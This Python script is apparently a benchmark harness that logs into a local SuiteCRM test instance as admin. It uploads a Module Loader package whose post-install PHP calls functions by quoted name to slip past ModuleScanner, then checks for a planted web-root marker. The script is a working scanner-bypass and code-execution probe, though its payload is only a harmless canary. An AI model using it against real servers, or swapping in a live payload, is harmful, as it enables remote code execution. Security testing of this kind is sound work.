#!/usr/bin/env python3
"""Drive REAL SuiteCRM Module Loader over HTTP (php:apache + cloned tree).

Uploads an MLP zip, lets ModuleScanner run, and (if the package is accepted)
lets ModuleInstaller include post_execute, which reads /tmp/pcb_canary.txt
and writes a web-root marker. Benign canary only.
"""
from __future__ import annotations

import io
import json
import os
import re
import sys
import time
import zipfile

import requests

ADMIN_USER = "admin"
ADMIN_PASS = "Admin123!"
DEFAULT_PORTS = {"v0": 39140, "v1": 39141, "v2": 39142}

QUOTED_PHP = """<?php
$c = 'file_get_contents'('/tmp/pcb_canary.txt');
'file_put_contents'('/var/www/html/pcb_marker_original.txt', $c);
"""


def _base_url(version: str) -> str:
    port = os.environ.get("PCB_TARGET_PORT")
    if port:
        return f"http://127.0.0.1:{int(port)}"
    pbt = os.environ.get("PCB_TARGET_BASE")
    if pbt:
        return pbt.rstrip("/")
    return f"http://127.0.0.1:{DEFAULT_PORTS.get(version, 39140)}"


def _manifest(name: str) -> str:
    return f"""<?php
$manifest = array(
    'acceptable_sugar_versions' => array(''),
    'acceptable_sugar_flavors' => array('CE'),
    'readme' => '',
    'key' => '{name}',
    'author' => 'PCB Benchmark',
    'description' => 'PCB canary module',
    'icon' => '',
    'is_uninstallable' => true,
    'name' => '{name}',
    'published_date' => '2026-01-01',
    'type' => 'module',
    'version' => '1.0.0',
);
$installdefs = array(
    'id' => '{name}',
    'post_execute' => array(
        '<basepath>/scripts/post_install.php',
    ),
);
"""


def _build_zip(name: str, post_install: str) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("manifest.php", _manifest(name))
        zf.writestr("scripts/post_install.php", post_install)
    return buf.getvalue()


def _request_retry(session: requests.Session, method: str, url: str, **kwargs):
    """SuiteCRM apache often drops the first Module Loader POST after silent install."""
    last = None
    for i in range(4):
        try:
            return session.request(method, url, **kwargs)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            last = e
            time.sleep(4 + i * 2)
    raise last


def _session(base: str) -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": "pcb-suitecrm-probe",
        "Referer": base + "/",
    })
    return s


def _skip_timezone(session: requests.Session, base: str, html: str, url: str) -> None:
    blob = (html or "") + " " + (url or "")
    if "SetTimezone" not in blob and "timezone" not in blob.lower():
        return
    session.post(
        f"{base}/index.php",
        data={
            "module": "Users",
            "action": "SaveTimezone",
            "timezone": "UTC",
            "ut": "1",
        },
        timeout=30,
        allow_redirects=True,
    )
    session.post(
        f"{base}/index.php",
        data={
            "module": "Users",
            "action": "SetTimezone",
            "timezone": "UTC",
            "ut": "1",
        },
        timeout=30,
        allow_redirects=True,
    )


def login(session: requests.Session, base: str) -> bool:
    _request_retry(session, "GET", f"{base}/index.php?module=Users&action=Login", timeout=30)
    r = _request_retry(
        session,
        "POST",
        f"{base}/index.php",
        data={
            "module": "Users",
            "action": "Authenticate",
            "user_name": ADMIN_USER,
            "username_password": ADMIN_PASS,
            "Login": "Log In",
        },
        allow_redirects=True,
        timeout=30,
    )
    _skip_timezone(session, base, r.text, str(r.url))
    check = session.get(
        f"{base}/index.php?module=Administration&action=index",
        timeout=30,
        allow_redirects=True,
    )
    _skip_timezone(session, base, check.text, str(check.url))
    check = session.get(
        f"{base}/index.php?module=Administration&action=index",
        timeout=30,
        allow_redirects=True,
    )
    return ("Module Loader" in check.text) or ("UpgradeWizard" in check.text) or ("Administration" in check.text)


def _extract_hash(list_html: str, module_name: str) -> str | None:
    data_match = re.findall(r"mti_data\s*=\s*\[(.*?)\];", list_html, re.DOTALL)
    if not data_match:
        hashes = re.findall(r"'([a-f0-9]{32})'", list_html)
        return hashes[0] if hashes else None
    entries = re.findall(r"\[([^\]]+)\]", data_match[0])
    for entry in entries:
        if module_name in entry:
            hashes = re.findall(r"'([a-f0-9]{32})'", entry)
            if hashes:
                return hashes[0]
    hashes = re.findall(r"'([a-f0-9]{32})'", data_match[0])
    return hashes[0] if hashes else None


def upload_and_install(
    session: requests.Session, base: str, zip_bytes: bytes, zip_name: str, module_name: str
) -> dict:
    result = {"uploaded": False, "installed": False, "scanner_blocked": False, "detail": ""}
    files = {"upgrade_zip": (zip_name, zip_bytes, "application/zip")}
    r = _request_retry(
        session,
        "POST",
        f"{base}/index.php?module=Administration&view=module&action=UpgradeWizard&run=upload",
        files=files,
        data={"run": "upload"},
        allow_redirects=True,
        timeout=90,
    )
    body = r.text.lower()
    if "ml_manifest_issue" in body or "ml_invalid_function" in body:
        result["scanner_blocked"] = True
        result["detail"] = "Scanner blocked at manifest scan"
        return result

    result["uploaded"] = True
    list_r = session.get(
        f"{base}/index.php?module=Administration&action=UpgradeWizard&view=module",
        timeout=30,
    )
    file_hash = _extract_hash(list_r.text, module_name)
    if not file_hash:
        result["detail"] = "Could not find file hash in Module Loader listing"
        return result

    r = _request_retry(
        session,
        "POST",
        f"{base}/index.php",
        data={
            "entryPoint": "HandleAjaxCall",
            "to_pdf": "1",
            "module": "Administration",
            "action": "HandleAjaxCall",
            "method": "performInstall",
            "file": file_hash,
        },
        timeout=120,
    )
    install_body = r.text.lower()
    if "invalid function" in install_body or "ml_invalid" in install_body or "file issues" in install_body:
        result["scanner_blocked"] = True
        issues = re.findall(r"(?:Invalid Function|ML_INVALID)[^<]*", r.text, re.IGNORECASE)
        result["detail"] = f"Scanner blocked at install: {'; '.join(issues[:3])}"
        return result
    if "success" in install_body:
        result["installed"] = True
    else:
        result["detail"] = f"Install result unclear: {r.text[:200]}"
        # Some SuiteCRM versions return JSON without the word success; treat empty issues as installed.
        if "issue" not in install_body and r.status_code == 200 and len(r.text) < 4000:
            result["installed"] = True
    return result


def check_canary(session: requests.Session, base: str, marker: str) -> str:
    for _ in range(8):
        try:
            r = session.get(f"{base}/{marker}", timeout=15)
            if r.status_code == 200 and r.text.strip():
                return r.text.strip()
        except requests.RequestException:
            pass
        time.sleep(1)
    return ""


def run_probe(candidate, version="v1"):
    base = _base_url(version)
    kind = (candidate or {}).get("kind") or "quoted"
    module_name = (candidate or {}).get("module_name") or (
        "PCBBypass" if kind == "concat" else "PCBOriginal"
    )
    # Unique package id so a leftover Module Loader install cannot collide.
    rid = (os.environ.get("RUN_ID") or "")[-6:]
    if rid and not module_name.endswith(rid):
        module_name = f"{module_name}{rid}"
    marker = (candidate or {}).get("marker") or (
        "pcb_marker_bypass.txt" if kind == "concat" else "pcb_marker_original.txt"
    )
    post_install = (candidate or {}).get("post_install") or QUOTED_PHP
    zip_bytes = _build_zip(module_name, post_install)
    session = _session(base)

    last_err = ""
    for _ in range(30):
        try:
            r = session.get(f"{base}/index.php?module=Users&action=Login", timeout=10)
            if r.status_code == 200 and "user_name" in r.text:
                break
        except requests.RequestException as exc:
            last_err = str(exc)
        time.sleep(2)
    else:
        raise RuntimeError(f"app not reachable at {base}: {last_err}")

    if not login(session, base):
        raise RuntimeError("login failed")

    result = upload_and_install(session, base, zip_bytes, f"{module_name}.zip", module_name)
    out = {
        "base_url": base,
        "kind": kind,
        "module_name": module_name,
        "marker": marker,
        "uploaded": result["uploaded"],
        "installed": result["installed"],
        "scanner_blocked": result["scanner_blocked"],
        "detail": result["detail"],
        "body": "",
    }
    if result["scanner_blocked"]:
        out["body"] = "BLOCKED_BY_SCANNER"
        return out
    if not result["installed"]:
        out["body"] = f"ERROR: {result['detail']}"
        return out
    marker_body = check_canary(session, base, marker)
    out["body"] = marker_body if marker_body else "NO_FLAG_DETECTED"
    return out


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    print(json.dumps(run_probe(cand, version=version), default=str))
